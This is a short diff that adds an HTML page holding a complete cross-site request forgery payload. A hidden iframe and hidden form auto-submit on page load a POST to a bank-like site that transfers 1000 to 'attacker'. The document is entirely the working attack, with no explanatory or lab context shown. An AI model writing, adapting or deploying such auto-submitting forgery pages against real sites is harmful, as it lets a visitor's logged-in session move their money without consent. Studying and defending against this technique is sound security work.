@@ -1,0 +1,6 @@
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method="POST" action="http://vulnerable-bank-953.com" target="csrf-frame" id="csrf-form">
+    <input type="hidden" name="to" value="attacker" />
+    <input type="hidden" name="amount" value="1000" />
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
